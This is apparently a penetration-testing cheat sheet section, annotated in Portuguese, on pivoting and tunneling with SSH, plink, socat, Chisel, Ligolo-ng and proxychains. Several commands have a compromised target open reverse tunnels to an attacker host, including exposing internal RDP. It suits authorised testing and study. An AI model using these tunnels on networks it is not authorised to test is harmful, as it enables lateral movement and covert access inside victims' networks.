# 10. Pivoting & Tunneling

### 10.1 Port forwarding (porta → porta)
```bash
# SSH remote (kali escuta 8081, acessa o remoto 172.24.0.2:80):
ssh -R 8081:172.24.0.2:80 test@<kali>
# SSH local:
ssh -L 8083:127.0.0.1:8084 user@remote
# Meterpreter:
portfwd add -l 4445 -p 4443 -r 10.1.1.1
# plink (Windows):
plink.exe <kali> -P 22 -C -N -L 0.0.0.0:4445:10.1.1.1:4443 -l KALIUSER -pw PASS
# socat (Linux):
./socat TCP4-LISTEN:8083,fork TCP4:62.41.90.2:443
# rinetd (kali /etc/rinetd.conf): 208.88.127.99 80 67.23.72.109 3389
```

### 10.2 Chisel
```bash
# kali (server reverso):
./chisel server -p 8000 --reverse
# target — remote tunnel (acessar IP:porta inacessível):
./chisel client <kali>:8000 R:127.0.0.1:8001:172.19.0.3:80
# target — local tunnel:
./chisel client <kali>:8000 9001:127.0.0.1:8003
```

### 10.2b Ligolo-ng (túnel via interface — sem proxychains)
```bash
# kali — criar interface e rota para a rede interna:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.5.0/24 dev ligolo
./proxy -selfcert                              # inicia o listener (porta 11601)
# target (agent):
./agent -connect <kali>:11601 -ignore-cert     # agent.exe no Windows
# no console do proxy:  session → escolher agente → start
# agora o kali fala direto com 172.16.5.x (nmap/xfreerdp/nxc sem proxychains).
```

### 10.3 Dynamic (SOCKS) + proxychains
```bash
# SSH dynamic:
ssh -D 1080 root@admin.megacorpone.com
# plink:
plink.exe <kali> -P 22 -C -N -D 1080 -l KALIUSER -pw PASS
# chisel socks:
./chisel client <kali>:8000 R:8001:127.0.0.1:1080   # + ./chisel server -p 8001 --socks5
# msf: multi/manage/autoroute + auxiliary/server/socks4a
# usar:
proxychains nmap -p3389 -sT -Pn 172.16.40.18-29 --open
proxychains rdesktop 172.16.40.20
```
> [!tip] Via proxychains/SOCKS use `nmap -Pn -sT` (SYN não funciona).

### 10.4 RDP via túnel (plink)
```cmd
:: no windows interno:
plink -l root -pw uberpass <kali> -R 3390:127.0.0.1:3389
```
```bash
rdesktop 127.0.0.1:3390
rdesktop -g 85% -r disk:share=/var/www -u user -p pass $IP
```
